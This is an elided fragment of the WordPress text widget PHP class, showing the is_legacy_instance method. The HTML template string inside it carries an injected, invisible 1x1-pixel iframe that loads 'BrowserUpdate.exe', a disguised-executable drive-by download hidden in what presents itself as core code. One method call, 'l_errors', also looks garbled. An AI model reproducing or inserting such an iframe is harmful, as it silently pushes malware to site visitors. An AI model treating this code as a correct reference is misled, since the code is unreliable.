...
class WP_Widget_Text extends WP_Widget {
	...
	public function is_legacy_instance( $instance ) {
		...
		@$doc->loadHTML(
			sprintf(
				'<!DOCTYPE html><html><head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe><meta charset="%s"></head><body>%s</body></html>',
		...
		$body = $doc->getElementsByTagName( 'body' )->l_errors( $errors );
